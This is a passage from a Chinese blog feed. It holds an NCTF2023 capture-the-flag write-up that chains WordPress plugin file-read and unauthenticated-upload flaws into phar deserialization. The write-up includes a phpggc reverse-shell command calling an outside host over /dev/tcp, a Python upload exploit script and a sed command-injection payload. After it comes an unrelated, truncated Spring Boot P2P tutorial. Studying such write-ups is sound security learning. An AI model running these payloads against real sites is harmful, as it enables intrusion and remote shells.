<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function download_video() &#123;</span><br><span class="line">if ( ! isset( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;	</span><br><span class="line">		</span><br><span class="line">if ( is_numeric( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	$file = get_post_meta( (int) $_GET[&#x27;dl&#x27;], &#x27;mp4&#x27;, true );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$file = base64_decode( $_GET[&#x27;dl&#x27;] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( empty( $file ) ) &#123;</span><br><span class="line">	die( esc_html__( &#x27;Download file URL is empty.&#x27;, &#x27;all-in-one-video-gallery&#x27; ) );</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来文章就是讲解如何触发ssrf漏洞（本文不做叙述）</p>
<p>看向下面的<strong>利用未经身份验证的任意文件下载</strong></p>
<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( $is_remote_file &amp;&amp; $formatted_path == &#x27;url&#x27; ) &#123;         </span><br><span class="line">	$data = @get_headers( $file, true );</span><br><span class="line">          </span><br><span class="line">	if ( ! empty( $data[&#x27;Content-Length&#x27;] ) ) &#123;</span><br><span class="line">		$file_size = (int) $data[ &#x27;Content-Length&#x27; ];          </span><br><span class="line">		&#125; else &#123;               </span><br><span class="line">			// If get_headers fails then try to fetch fileSize with curl</span><br><span class="line">			$ch = @curl_init();</span><br><span class="line">			if ( ! @curl_setopt( $ch, CURLOPT_URL, $file ) ) &#123;</span><br><span class="line">            	@curl_close( $ch );</span><br><span class="line">            	@exit;</span><br><span class="line">        	&#125;</span><br><span class="line">               </span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_NOBODY, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_HEADER, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_MAXREDIRS, 3 );</span><br><span class="line">        	@curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, 10 );</span><br><span class="line">        	@curl_exec( $ch );</span><br><span class="line">               </span><br><span class="line">			if ( ! @curl_errno( $ch ) ) &#123;</span><br><span class="line">				$http_status = (int) @curl_getinfo( $ch, CURLINFO_HTTP_CODE );</span><br><span class="line">				if ( $http_status &gt;= 200 &amp;&amp; $http_status &lt;= 300 )&#123;</span><br><span class="line">					$file_size = (int) @curl_getinfo( $ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD );</span><br><span class="line">				&#125;</span><br><span class="line">				@curl_close( $ch );</span><br><span class="line">        	&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;else&#123;	</span><br><span class="line">	$chunk = 1 * ( 1024 * 1024 );</span><br><span class="line">	$nfile = @fopen( $file, &#x27;rb&#x27; );</span><br><span class="line">	while ( ! feof( $nfile ) ) &#123;                 </span><br><span class="line">		print( @fread( $nfile, $chunk ) );</span><br><span class="line">    	@ob_flush();</span><br><span class="line">    	@flush();</span><br><span class="line">&#125;</span><br><span class="line">@fclose( $filen );</span><br></pre></td></tr></table></figure>

<p>如果<code>is_remote_file</code>为真，<code>formatted_path</code>等于url，那么将使用 cURL 库发出请求，否则如果将使用“fopen”函数来读取文件。</p>
<p>我们看一下如何实现，<code>&amp;&amp;</code>运算符只要第一个为假表达式即为假，所以目的是让<code>is_remote_file</code>为假</p>
<p>看向下面这段代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( strpos( $file, home_url() ) !== false ) &#123;</span><br><span class="line">	$is_remote_file = false;</span><br><span class="line">&#125;		        		</span><br><span class="line">          </span><br><span class="line">if ( preg_match( &#x27;#http://#&#x27;, $file ) || preg_match( &#x27;#https://#&#x27;, $file ) ) &#123;</span><br><span class="line">    $formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$formatted_path = &#x27;filepath&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $is_remote_file ) &#123;</span><br><span class="line">	$formatted_path = &#x27;url&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个 if 语句检查 $file 变量中<code>home_url()</code>的出现，其中file变量是dl参数的值，<code>home_url</code>是 WordPress 安装的完整 URL。</p>
<p>如果dl参数具有 WordPress 路径的 URL，则<code>is_remote_file</code>的值将为false。</p>
<p>也就是说我们可以通过file等协议读取文件，并添加有效的url路径，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://http://xxx.com/index.php</span><br></pre></td></tr></table></figure>

<p>最后再base64编码一下即可</p>
<p>我们已经分析完怎么文件读取，结合hint5那么接下来就是如何上传phar文件</p>
<p>根据关键词和版本信息找到插件drag-and-drop-multiple-file-upload-contact-form-7具有XSS漏洞（本质是可以未授权上传图片）</p>
<p><a href="https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de/">参考文章</a></p>
<blockquote>
<p>至于为什么思路是上传phar文件，我们结合前文分析的漏洞可以知道用协议去读取文件，当然包括phar协议</p>
</blockquote>
<p><img src="/article/NCTF2023/image-20231229143821345.png"></p>
<p>这篇文章直接就给了POC，大概意思就是在<code>/wp-admin/admin-ajax.php</code>路径进行文件上传，我们把该poc中的xss内容换成我们phar文件内容即可</p>
<p>那么我们先生成用来RCE的phar文件，直接用工具phpggc生成反弹shell文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot; -p phar -o ~/payload.phar</span><br></pre></td></tr></table></figure>

<p>在题目访问<code>/wp-admin/admin-ajax.php</code>抓包</p>
<p>将poc复制上去，修改下文件名为4.jpg以及文件内容为phar（右键从文件粘贴）</p>
<p><img src="/article/NCTF2023/image-20231229201808140.png"></p>
<p>测试后发现也能弹shell，不会出现二进制数据格式错误</p>
<p>当然也可以用python脚本上传文件（按照poc改的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.71.184.68:8012/wp-admin/admin-ajax.php&#x27;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-GB,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;close&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    &#x27;size_limit&#x27;: (None, &#x27;10485760&#x27;),</span><br><span class="line">    &#x27;action&#x27;: (None, &#x27;dnd_codedropz_upload&#x27;),</span><br><span class="line">    &#x27;type&#x27;: (None, &#x27;click&#x27;),</span><br><span class="line">    &#x27;upload-file&#x27;: (&#x27;1.jpg&#x27;, open(&#x27;payload.phar&#x27;, &#x27;rb&#x27;), &#x27;image/jpeg&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, files=files)</span><br><span class="line"></span><br><span class="line">print(response.status_code)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="/article/NCTF2023/image-20231229201102713.png"></p>
<p>然后就是文件读取，将payload编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/1.jpg/test.txt</span><br></pre></td></tr></table></figure>

<p>注意phar url的结尾必须加上 <code>/test.txt</code> ,因为在构造phar文件的时候执行的是 <code>$phar-addFromString(&quot;test.txt&quot;, &quot;test&quot;);</code> ,这里的路径需要与代码中的test.txt对应,否则网站会⼀直卡住</p>
<p>访问<code>/index.php/video</code>并传递参数dl去phar读取文件</p>
<p><img src="/article/NCTF2023/image-20231229201131924.png"></p>
<p>成功反弹shell</p>
<p><img src="/article/NCTF2023/image-20231229201213786.png"></p>
<p>尝试suid提权，发现可用命令</p>
<p><img src="/article/NCTF2023/image-20231229201305498.png"></p>
<p>查找一下date命令如何提权</p>
<p><img src="/article/NCTF2023/image-20231229201648495.png"></p>
<p>得到flag</p>
<p><img src="/article/NCTF2023/image-20231229201621224.png"></p>
<h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><blockquote>
<p>考点：sed命令</p>
</blockquote>
<p>打开题目，大概意思就是可以生成webshell并下载下来<br><img src="/article/NCTF2023/image-20240401201433227.png"></p>
<p>hint1给了附件，直接代码审计<br>index.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function security_validate()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        if (preg_match(&#x27;/\r|\n/&#x27;, $value)) &#123;</span><br><span class="line">            die(&quot;$key 不能包含换行符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strlen($value) &gt; 114) &#123;</span><br><span class="line">            die(&quot;$key 不能超过114个字符！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">security_validate();</span><br><span class="line">if (@$_POST[&#x27;method&#x27;] &amp;&amp; @$_POST[&#x27;key&#x27;] &amp;&amp; @$_POST[&#x27;filename&#x27;]) &#123;</span><br><span class="line">    if ($_POST[&#x27;language&#x27;] !== &#x27;PHP&#x27;) &#123;</span><br><span class="line">        die(&quot;PHP是最好的语言&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $method = $_POST[&#x27;method&#x27;];</span><br><span class="line">    $key = $_POST[&#x27;key&#x27;];</span><br><span class="line">    putenv(&quot;METHOD=$method&quot;) or die(&quot;你的method太复杂了！&quot;);</span><br><span class="line">    putenv(&quot;KEY=$key&quot;) or die(&quot;你的key太复杂了！&quot;);</span><br><span class="line">    $status_code = -1;</span><br><span class="line">    $filename = shell_exec(&quot;sh generate.sh&quot;);</span><br><span class="line">    if (!$filename) &#123;</span><br><span class="line">        die(&quot;生成失败了！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = trim($filename);</span><br><span class="line">    header(&quot;Location: download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>POST传参接收三个参数，如果参数language不为php，那么分别设置环境变量METHOD和KEY，执行generate.sh文件并赋值给filename，然后跳转到download.php进行文件下载</p>
<p>我们可以抓包看一下<br><img src="/article/NCTF2023/image-20240401201504690.png"></p>
<p>当我们直接访问的话可以读取到该生成的文件<br>也就是说存在任意文件读取</p>
<p><img src="/article/NCTF2023/image-20240401201553160.png"></p>
<p>根据hint提示我们要读取<code>/readflag</code>，我们分析一下如何读取<br>按照刚刚的测试，读取的文件路径是由<code>$filename = shell_exec(&quot;sh generate.sh&quot;);</code>决定，那么我们跟进一下<br>generate.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure>
<p>可以发现是使用sed命令的<code>-i</code>参数，我们查找下</p>
<p><img src="/article/NCTF2023/image-20240401201614723.png"></p>
<p>可以编辑文件内容，而<code>s/KEY/$KEY/g</code> 是 sed 命令的替换操作部分<br>也就是说生成的webshell中会替换两个值<br><img src="/article/NCTF2023/image-20240401201639360.png"></p>
<p>sed命令中可以用<code>;</code>来分隔指令，e参数用来命令执行<br>我们在参数key的地方注入，前后闭合即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/g;e /readflag;s/</span><br></pre></td></tr></table></figure>
<p>至于为什么是e而不是-e，解释如下</p>
<blockquote>
<p>GNU sed中的sed -i s&#x2F;hello&#x2F;g;e &#x2F;readflag命令中的e参数是用来执行一个外部命令的。在这个命令中，e参数后面跟着的是一个外部命令&#x2F;readflag，它会被sed执行在sed命令中，-e参数用于指定一个或多个sed脚本命令，而-i参数用于直接修改文件内容。因此，我们想要在sed命令中执行一个外部命令，我们需要使用e参数而不是-e参数</p>
</blockquote>
<p><img src="/article/NCTF2023/image-20240401201711511.png"></p>
<p>然后再访问得到flag</p>
<p><img src="/article/NCTF2023/image-20240401201729069.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>区块链实训2</title>
    <url>/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5.html</url>
    <content><![CDATA[<p>基于springboot框架实现P2P技术</p>
<span id="more"></span>

<h1 id="P2P技术实践：以P2P下载器为例"><a href="#P2P技术实践：以P2P下载器为例" class="headerlink" title="P2P技术实践：以P2P下载器为例"></a>P2P技术实践：以P2P下载器为例</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="区块链中点对点技术基础"><a href="#区块链中点对点技术基础" class="headerlink" title="区块链中点对点技术基础"></a>区块链中点对点技术基础</h3><p>区块链中的点对点（P2P）技术基础是构建分布式网络的关键部分，它允许网络中的各个节点直接相互通信，无需通过中央服务器。</p>
<h3 id="1-P2P网络的特点"><a href="#1-P2P网络的特点" class="headerlink" title="1. P2P网络的特点"></a>1. P2P网络的特点</h3><ul>
<li><strong>去中心化</strong>：没有单一的控制点，每个节点都有相同的功能和权利。</li>
<li><strong>分布性</strong>：数据和服务分布在多个节点上。</li>
<li><strong>容错性</strong>：即使部分节点失败，网络仍然可以继续运行。</li>
</ul>
<h3 id="2-主要组件"><a href="#2-主要组件" class="headerlink" title="2. 主要组件"></a>2. 主要组件</h3><ul>
<li><strong>节点</strong>：网络中的每个参与实体，包括全节点、轻节点等。</li>
<li><strong>消息传递</strong>：节点之间通过网络协议交换信息，包括交易数据、区块信息等</li>
</ul>
<h3 id="3-P2P网络结构"><a href="#3-P2P网络结构" class="headerlink" title="3. P2P网络结构"></a>3. P2P网络结构</h3><ul>
<li><strong>节点发现</strong>：新节点加入网络时需要找到其他节点建立连接。这可以通过引导节点、预先配置的节点列表或DNS种子等方式实现。</li>
<li><strong>消息传播</strong>：节点间的消息传播机制，确保交易和区块信息在整个网络中迅速扩散。</li>
<li><strong>网络拓扑</strong>：节点之间的连接模式，可以是完全去中心化的，也可以是混合型的（例如超级节点模型）。</li>
</ul>
<h3 id="4-典型应用"><a href="#4-典型应用" class="headerlink" title="4. 典型应用"></a>4. 典型应用</h3><ul>
<li><strong>比特币网络</strong>：比特币是最早采用P2P技术的区块链之一，其P2P网络允许节点间直接交换交易数据和区块信息。</li>
<li><strong>以太坊网络</strong>：以太坊同样采用了P2P网络来支持智能合约的执行和交易确认。</li>
</ul>
<h2 id="P2P下载器概述"><a href="#P2P下载器概述" class="headerlink" title="P2P下载器概述"></a>P2P下载器概述</h2><p>P2P下载器是一类用于获取大文件或数据的应用程序，利用点对点技术(P2P)实现高效的下载过程。与传统的中心化下载方式不同，P2P下载器允许用户从多个源同时下载文件，提高了下载速度和资源利用率。这种技术在文件共享、内容分发等领域有着广泛的应用。</p>
<h2 id="P2P-下载器工作原理"><a href="#P2P-下载器工作原理" class="headerlink" title="P2P 下载器工作原理"></a>P2P 下载器工作原理</h2><ol>
<li>种子文件创建：上传者创建一个种子文件，其中包含了要下载文件的元信息，如文件名、大小、哈希值等。这个种子文件会被分享给其他用户，作为下载的起点。</li>
<li>连接节点：下载者使用P2P下载器打开种子文件，软件根据其中的信息连接到 P2P网络中的其他节点，这些节点可能是其他下载者或拥有文件的上传者。</li>
<li>分块划分：文件被分成较小的块，每个块都有一个唯一的标识符。这些块可以从不同的节点处下载，实现并行下载以提高速度。</li>
<li>块选择和下载：下载者从可用的节点列表中选择要下载的块。根据块的可用性和下载速度，P2P下载器动态地选择最优的节点进行下载，从多个源同时获取数据。</li>
<li>块共享：下载者下载完成一个块后，也会变成一个可供其他下载者获取的源。这种共享机制使得更多的节点能够参与下载，提高整体的下载效率。</li>
<li>文件组装：下载者完成所有块的下载后，P2P下载器会将这些块按照原始文件的结构和顺序进行组装，生成完整的文件。</li>
</ol>
<h2 id="使用springboot框架实现本地文件的转移"><a href="#使用springboot框架实现本地文件的转移" class="headerlink" title="使用springboot框架实现本地文件的转移"></a>使用springboot框架实现本地文件的转移</h2><h3 id="1-springboot基础架构"><a href="#1-springboot基础架构" class="headerlink" title="1. springboot基础架构"></a>1. springboot基础架构</h3><p>Spring Boot 应用程序通常遵循分层架构设计原则，其中最常见的是三层架构：Controller、Service 和 Repository。每一层都有其特定的责任，这种分层有助于保持代码的清晰、可维护性和可测试性。以下是各层的基本介绍：</p>
<ol>
<li>Controller 层</li>
</ol>
<ul>
<li><p><strong>职责</strong>：处理来自用户的请求，并将请求映射到相应的业务逻辑或数据访问操作。控制器层是应用程序的入口点，它接收HTTP请求，并调用Service层的方法来处理业务逻辑。</p>
</li>
<li><p><strong>实例</strong>：在Spring MVC中，控制器通常由带有<code>@RestController</code>或<code>@Controller</code>注解的类实现。</p>
</li>
<li><p><strong>示例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BookService bookService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/books&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">getAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookService.getAllBooks();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>Service 层</li>
</ol>
<ul>
<li><p><strong>职责</strong>：包含应用程序的核心业务逻辑。这一层处理复杂的业务规则和流程，并协调多个Repository的操作。</p>
</li>
<li><p><strong>实例</strong>：Service层通常由带有<code>@Service</code>注解的类实现。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BookRepository bookRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Book&gt; <span class="title function_">getAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bookRepository.findAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>Repository 层</li>
</ol>
<ul>
<li><p><strong>职责</strong>：负责与数据库交互，实现数据的持久化和检索。Repository层封装了对数据库的访问细节，并提供了简单的接口给Service层使用。</p>
</li>
<li><p><strong>实例</strong>：Repository层通常由带有<code>@Repository</code>注解的类实现，并且经常使用Spring Data JPA或其他ORM框架来简化数据库操作。</p>
</li>
<li><p><strong>示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookRepository</span> &#123;</span><br><span class="line">    <span class="comment">// 自定义查询方法可以在这里定义</span></span><br><span class="line">    List&lt;Book&gt; <span class="title function_">findAllBooks</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookRepositoryImpl</span> <span class="keyword">implements</span> <span class="title class_">BookRepository</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">	<span class="keyword">private</span> NamedParameterJdbcTemplate namedParameterJdbcTemplate;</span><br><span class="line"></span><br><span class="line">    List&lt;Book&gt; <span class="title function_">findAllBooks</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MapSqlParameterSource</span> <span class="variable">paramSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapSqlParameterSource</span>();</span><br><span class="line">		List&lt;Boook&gt; list= namedParameterJdbcTemplate.query(<span class="string">&quot;select * from t_book&quot;</span>, paramSource, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;&gt;(Book.class));</span><br><span class="line">		<span class="keyword">if</span>(list!=<span class="literal">null</span> &amp;&amp; list.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> list;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-Path类简介"><a href="#2-Path类简介" class="headerlink" title="2. Path类简介"></a>2. Path类简介</h3><p>在Java中，<code>java.nio.file.Path</code> 类是Java 7引入的一个新类，用于表示文件系统的路径。它提供了对文件路径的高级抽象，使得处理文件路径变得更加简单和一致。</p>
<p>主要特点</p>
<ol>
<li><strong>平台无关性</strong>：</li>
</ol>
<ul>
<li><code>Path</code> 类支持跨平台的操作，可以自动处理不同操作系统之间的路径差异（例如Windows使用反斜杠<code>\</code>，Unix&#x2F;Linux使用正斜杠<code>/</code>）。</li>
</ul>
<ol start="2">
<li><strong>路径操作</strong>：</li>
</ol>
<ul>
<li><code>Path</code> 类提供了一系列静态工厂方法和实例方法，用于创建和操作路径，如解析路径、获取父路径、获取文件名等。</li>
</ul>
<ol start="3">
<li><strong>与文件系统集成</strong>：</li>
</ol>
<ul>
<li><code>Path</code> 类与<code>FileSystem</code>紧密集成，可以轻松地获取文件系统的相关信息。</li>
</ul>
<p>我们新建一个sprintboot项目，导入maven，然后点击重新加载所有Maven项目即可</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240921165856972.png"></p>
<p>导入springboot依赖，点击刷新maven就会去镜像仓库下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.4.0&lt;/version&gt;</span><br><span class="line">        &lt;relativePath/&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;test_p2p&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;$&#123;java.version&#125;&lt;/source&gt;</span><br><span class="line">                    &lt;target&gt;$&#123;java.version&#125;&lt;/target&gt;</span><br><span class="line">                    &lt;encoding&gt;$&#123;project.build.sourceEncoding&#125;&lt;/encoding&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line"></span><br><span class="line">    &lt;repositories&gt;</span><br><span class="line">        &lt;repository&gt;</span><br><span class="line">            &lt;id&gt;public&lt;/id&gt;</span><br><span class="line">            &lt;name&gt;aliyun nexus&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">            &lt;releases&gt;</span><br><span class="line">                &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">            &lt;/releases&gt;</span><br><span class="line">        &lt;/repository&gt;</span><br><span class="line">    &lt;/repositories&gt;</span><br><span class="line"></span><br><span class="line">    &lt;pluginRepositories&gt;</span><br><span class="line">        &lt;pluginRepository&gt;</span><br><span class="line">            &lt;id&gt;public&lt;/id&gt;</span><br><span class="line">            &lt;name&gt;aliyun nexus&lt;/name&gt;</span><br><span class="line">            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">            &lt;releases&gt;</span><br><span class="line">                &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">            &lt;/releases&gt;</span><br><span class="line">            &lt;snapshots&gt;</span><br><span class="line">                &lt;enabled&gt;false&lt;/enabled&gt;</span><br><span class="line">            &lt;/snapshots&gt;</span><br><span class="line">        &lt;/pluginRepository&gt;</span><br><span class="line">    &lt;/pluginRepositories&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>然后创建test软件包，创建PathExample类进行测试</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240921163652103.png"></p>
<p>测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PathExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:\\idea_project\\test_p2p\\test\\hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取父路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">parentpath</span> <span class="operator">=</span> path.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;Parent_path: &quot;</span> + parentpath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取文件名</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">fileName</span> <span class="operator">=</span> path.getFileName();</span><br><span class="line">        System.out.println(<span class="string">&quot;File name: &quot;</span> + fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析相对路径，相当于拼接到父路径后面</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">resolvedPath</span> <span class="operator">=</span> parentpath.resolve(<span class="string">&quot;test1\\hello1.txt&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Resolve_path: &quot;</span> + resolvedPath);</span><br><span class="line">        </span><br><span class="line">        <span 